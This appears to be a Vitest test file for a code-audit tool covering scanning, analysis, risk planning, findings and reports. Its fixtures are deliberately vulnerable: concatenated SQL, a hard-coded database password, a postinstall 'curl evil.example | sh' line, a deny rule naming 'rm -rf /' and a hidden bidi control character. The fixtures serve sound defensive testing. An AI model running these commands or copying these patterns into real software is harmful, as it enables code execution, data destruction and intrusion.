import { readFile, symlink } from "node:fs/promises";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { runAnalyzers } from "../analyze/run.js";
import { localToolCommand } from "../analyze/tools.js";
import { getDb } from "../db/db.js";
import { recordFindings } from "../findings/record.js";
import { buildContext } from "../plan/context.js";
import { runQuery } from "../plan/query.js";
import { loadPlan, planUnits, savePlan } from "../plan/risk.js";
import { buildReports } from "../report/export.js";
import { scan } from "../scan/scan.js";
import { overviewView } from "../daemon/views.js";
import { cleanup, makeProject } from "./helpers.js";

const PROJECT = {
  "package.json": JSON.stringify({ name: "fixture", version: "1.0.0" }),
  "src/core/db.ts": `
export function connect(url: string) { return { url }; }
export function query(sql: string) { return sql; }
`,
  "src/api/users.ts": `
import { query } from "../core/db";
export function getUser(id: string) { return query("SELECT * FROM users WHERE id = " + id); }
`,
  "src/api/orders.ts": `
import { query } from "../core/db";
import { getUser } from "./users";
export function getOrders(id: string) { return query("SELECT 1") + getUser(id); }
`,
  "src/config.py": `
DATABASE_URL = "postgres://admin:hunter2pass@prod.internal:5432/app"

def load():
    return DATABASE_URL
`,
  "src/core/db.test.ts": `import { connect } from "./db";\nconnect("x");\n`,
};

let root: string;
let outside: string;
afterEach(async () => {
  if (root) await cleanup(root);
  if (outside) await cleanup(outside);
});

describe("pipeline", () => {
  it("never follows a review-unit symlink outside the workspace", async () => {
    root = await makeProject({ "package.json": "{}" });
    outside = await makeProject({ "secret.ts": "export const secret = 'do-not-leak';\n" });
    await symlink(join(outside, "secret.ts"), join(root, "linked.ts"));
    const db = await getDb(root);

    const context = await buildContext(
      db,
      {
        id: "unit-symlink",
        paths: ["linked.ts"],
        languages: ["typescript"],
        risk: 1,
        estimatedTokens: 10,
        reason: "path boundary test",
      },
      { projectRoot: root, pluginRoot: root },
    );

    expect(context.prompt).not.toContain("do-not-leak");
    expect(context.filesOmitted).toEqual(["linked.ts"]);
  });

  it("runs Windows npm shims through cmd while keeping Python executables direct", () => {
    expect(localToolCommand("C:\\repo\\node_modules\\.bin\\eslint.cmd", true, "win32", "cmd.exe"))
      .toEqual({
        command: "C:\\repo\\node_modules\\.bin\\eslint.cmd",
        platform: "win32",
        comspec: "cmd.exe",
      });
    expect(localToolCommand("C:\\repo\\.venv\\Scripts\\ruff.exe", false, "win32"))
      .toEqual({
        command: "C:\\repo\\.venv\\Scripts\\ruff.exe",
        platform: "win32",
        comspec: "cmd.exe",
      });
  });

  it("scans, analyses, plans, contextualises, records and exports", async () => {
    root = await makeProject(PROJECT);

    const scanResult = await scan(root, { kind: "full" });
    expect(scanResult.filesParsed).toBeGreaterThan(0);

    const analysis = await runAnalyzers(root, { offline: true });
    // The python config file holds a real-looking connection string.
    expect(analysis.created).toBeGreaterThan(0);
    const secretTool = analysis.tools.find((tool) => tool.tool === "secrets");
    expect(secretTool?.status).toBe("ok");

    // Tools absent from the fixture must report as skipped, never as clean.
    const eslint = analysis.tools.find((tool) => tool.tool === "eslint");
    expect(eslint?.status).toBe("skipped");
    expect(eslint?.detail).toMatch(/not installed/);

    const db = await getDb(root);

    // Risk ranking puts the widely-imported, untested file near the top.
    const units = planUnits(db, { maxUnits: 10 });
    savePlan(db, units);
    expect(units.length).toBeGreaterThan(0);
    expect(loadPlan(db).length).toBe(units.length);

    const unit = units[0];
    const context = await buildContext(db, unit, { projectRoot: root, pluginRoot: root });
    expect(context.prompt).toContain("# Review unit");
    expect(context.prompt).toContain("KNOWN FINDINGS");
    expect(context.prompt).toContain("audit_record_findings");
    expect(context.filesIncluded).toBeGreaterThan(0);

    // An agent records a judgement finding.
    recordFindings(db, analysis.runId, [
      {
        ruleId: "llm/sql-injection",
        category: "security",
        severity: "critical",
        confidence: "high",
        source: "llm",
        title: "String-concatenated SQL in getUser",
        description: "id is interpolated into the query.",
        path: "src/api/users.ts",
        lineStart: 3,
      },
    ]);

    const reports = buildReports(db);
    expect(reports.openFindings).toBeGreaterThan(0);
    expect(reports.audit).toContain("String-concatenated SQL");
    expect(reports.map).toContain("src/core/db.ts");
    expect(reports.tasks.length).toBeGreaterThan(0);
    expect(reports.tasks[0]?.severity).toBe("critical");

    // Reports are returned, never written: the app renders them, and a
    // working tree gains no files it then has to ignore.
    await expect(readFile(join(root, "sdlc-audit", "TASKS.json"), "utf-8")).rejects.toThrow();
    await expect(
      readFile(join(root, "sdlc-audit", "reports", "AUDIT.md"), "utf-8"),
    ).rejects.toThrow();
  });

  it("answers graph queries", async () => {
    root = await makeProject(PROJECT);
    await scan(root, { kind: "full" });
    const db = await getDb(root);

    const ctx = { db, pluginRoot: root };
    const importers = (await runQuery(ctx, "importers", "src/core/db.ts")) as Array<{
      importer: string;
    }>;
    expect(importers.map((row) => row.importer).sort()).toEqual([
      "src/api/orders.ts",
      "src/api/users.ts",
      "src/core/db.test.ts",
    ]);

    const symbols = (await runQuery(ctx, "symbol", "getUser")) as Array<{ path: string }>;
    expect(symbols[0].path).toBe("src/api/users.ts");

    const hotspots = (await runQuery(ctx, "hotspots", undefined, 3)) as Array<{
      path: string;
      fan_in: number;
    }>;
    expect(hotspots[0].path).toBe("src/core/db.ts");
  });

  it("wires supply-chain and unicode analysis into the run", async () => {
    root = await makeProject({
      ...PROJECT,
      "package.json": JSON.stringify({
        name: "fixture",
        scripts: { postinstall: "curl -s https://evil.example/i.sh | sh" },
      }),
      ".claude/settings.json": JSON.stringify({
        permissions: { allow: ["Bash(*)"], deny: ["Bash(rm -rf /)"] },
      }),
      "src/smuggled.ts": `const admin = false; // ${String.fromCodePoint(0x202e)}flip\n`,
    });

    await scan(root, { kind: "full" });
    const analysis = await runAnalyzers(root, { offline: true });

    const byTool = Object.fromEntries(analysis.tools.map((tool) => [tool.tool, tool]));
    expect(byTool["supply-chain"].status).toBe("ok");
    expect(byTool["unicode"].status).toBe("ok");

    const db = await getDb(root);
    const rules = db
      .all<{ rule_id: string }>(
        "SELECT DISTINCT rule_id FROM findings WHERE status = 'open' ORDER BY rule_id",
      )
      .map((row) => row.rule_id);

    expect(rules).toContain("supply-chain/install-script-execution");
    expect(rules).toContain("supply-chain/agent-broad-permission");
    expect(rules).toContain("unicode/bidi-control");

    // The deny-listed command must not be reported as a use of it.
    expect(rules).not.toContain("supply-chain/agent-config-execution");

    // Both new sources take part in the fix lifecycle like any other tool.
    const { writeFile } = await import("node:fs/promises");
    await writeFile(join(root, "src/smuggled.ts"), "const admin = false;\n");
    await scan(root, { kind: "incremental" });
    const second = await runAnalyzers(root, { offline: true });

    expect(second.closed).toBeGreaterThan(0);
    expect(
      db.count(
        "SELECT COUNT(*) AS n FROM findings WHERE rule_id = 'unicode/bidi-control' AND status = 'fixed'",
      ),
    ).toBe(1);
  });

  it("carries findings across runs and reports fixes", async () => {
    root = await makeProject(PROJECT);
    await scan(root, { kind: "full" });
    const first = await runAnalyzers(root, { offline: true });
    expect(first.created).toBeGreaterThan(0);

    const db = await getDb(root);
    const openAfterFirst = db.count(
      "SELECT COUNT(*) AS n FROM findings WHERE status IN ('open','regressed')",
    );

    // Re-running with no code change must not duplicate anything.
    const second = await runAnalyzers(root, { offline: true });
    expect(second.created).toBe(0);
    expect(
      db.count("SELECT COUNT(*) AS n FROM findings WHERE status IN ('open','regressed')"),
    ).toBe(openAfterFirst);

    // Remove the secret; the finding should close itself.
    const { writeFile } = await import("node:fs/promises");
    await writeFile(
      join(root, "src/config.py"),
      'import os\n\nDATABASE_URL = os.environ["DATABASE_URL"]\n',
    );
    await scan(root, { kind: "incremental" });
    const third = await runAnalyzers(root, { offline: true });

    expect(third.closed).toBeGreaterThan(0);
    expect(
      db.count("SELECT COUNT(*) AS n FROM findings WHERE rule_id LIKE 'secrets/%' AND status = 'fixed'"),
    ).toBeGreaterThan(0);
  });

  it("keeps the latest analyzer status visible after a watcher scan", async () => {
    root = await makeProject(PROJECT);
    await scan(root, { kind: "full" });
    await runAnalyzers(root, { offline: true });
    const db = await getDb(root);
    const before = overviewView(db);

    await scan(root, { kind: "watch" });
    const after = overviewView(db);

    expect(before.tools.length).toBeGreaterThan(0);
    expect(after.tools).toEqual(before.tools);
    expect(after.lastRun?.kind).toBe("tools");
  });
});
